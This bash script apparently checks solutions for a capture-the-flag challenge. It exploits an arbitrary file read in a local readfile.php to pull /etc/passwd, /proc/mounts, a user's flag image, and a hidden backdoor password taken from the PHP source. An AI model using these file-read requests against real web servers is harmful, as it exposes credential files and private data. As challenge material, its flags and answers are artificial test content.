#!/bin/bash

BASE_URL="http://localhost:8080"

echo ================================================================================
echo testing brightness...
echo YOU SHOULD SEE ONLY TWO LINES BELOW:
echo --------------------------------------------------------------------------------
curl --silent "$BASE_URL/readfile.php?filename=/sys/class/backlight/"{acpi_video0,amdgpu_bl0,intel_backlight}/{actual_brightness,brightness,max_brightness} | grep '^[0-9]*' -o | sort | uniq
if [ 2 -eq $(curl --silent "$BASE_URL/readfile.php?filename=/sys/class/backlight/"{acpi_video0,amdgpu_bl0,intel_backlight}/{actual_brightness,brightness,max_brightness} | grep '^[0-9]*' -o | sort | uniq | wc -l) ] ; then
	echo "SUCCESS!"
else
	echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
fi
echo --------------------------------------------------------------------------------
echo now calculating brightness percentage...
brightness="$(curl --silent "$BASE_URL/readfile.php?filename=/sys/class/backlight/"{acpi_video0,amdgpu_bl0,intel_backlight}/{actual_brightness,brightness} | grep '^[0-9]*' -o | sort | uniq)"
max_brightness="$(curl --silent "$BASE_URL/readfile.php?filename=/sys/class/backlight/"{acpi_video0,amdgpu_bl0,intel_backlight}/{max_brightness} | grep '^[0-9]*' -o | sort | uniq)"
echo "$(( 100 * $brightness / $max_brightness ))%"
if [ "67" -eq "$(( 100 * $brightness / $max_brightness ))" ] ; then
	echo SUCCESS!
else
	echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
fi
echo --------------------------------------------------------------------------------
echo
echo
echo
echo
echo ================================================================================
echo testing mountpoint flag...
echo you should see the flag below:
echo --------------------------------------------------------------------------------
curl --silent "$BASE_URL/readfile.php?filename=/proc/mounts" | grep RCCTF && echo "SUCCESS!" || echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo --------------------------------------------------------------------------------
echo
echo
echo
echo
echo ================================================================================
echo testing if reading php file gets flag...
echo --------------------------------------------------------------------------------
secret_backdoor_password=$(curl --silent "$BASE_URL/readfile.php?filename=readfile.php" | grep "welcome to the secret backdoor" -i -B 1 | head -n 1 | grep '"[^"]*"' -o | sed 's/"//g')
echo password is $secret_backdoor_password
curl --silent "$BASE_URL/readfile.php?filename=$secret_backdoor_password" | grep -i 'RCCTF{[^}]*}' -o && echo "SUCCESS!" || echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo --------------------------------------------------------------------------------
echo
echo
echo
echo
echo ================================================================================
echo testing etc/passwd flag...
echo 'should see "/usr/bin/cat"'
echo --------------------------------------------------------------------------------
curl --silent "$BASE_URL/readfile.php?filename=/etc/passwd" | grep -i 'steve'
curl --silent "$BASE_URL/readfile.php?filename=/etc/passwd" | grep -i 'steve' | grep -i '/usr/bin/cat' -o && echo "SUCCESS!" || echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo --------------------------------------------------------------------------------
echo
echo
echo
echo
echo ================================================================================
echo making sure the image is accessible...
echo --------------------------------------------------------------------------------
curl --silent "$BASE_URL/readfile.php?filename=/home/steven/Desktop/flag.png" | tail -n +3 | file -
echo expected and found shasums:
echo 40fc5336aa2d3ded84bb383247cc97839e5cff7927e73508b54c7bbe9427232b
curl --silent "$BASE_URL/readfile.php?filename=/home/steven/Desktop/flag.png" | tail -n +3 | sha256sum


[ 1 -eq $( ( echo 40fc5336aa2d3ded84bb383247cc97839e5cff7927e73508b54c7bbe9427232b ; 
curl --silent "$BASE_URL/readfile.php?filename=/home/steven/Desktop/flag.png" | tail -n +3 | sha256sum ) | sed 's/ *-*//g' | uniq | wc -l ) ] && echo SUCCESS! || echo "FAIL!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo --------------------------------------------------------------------------------
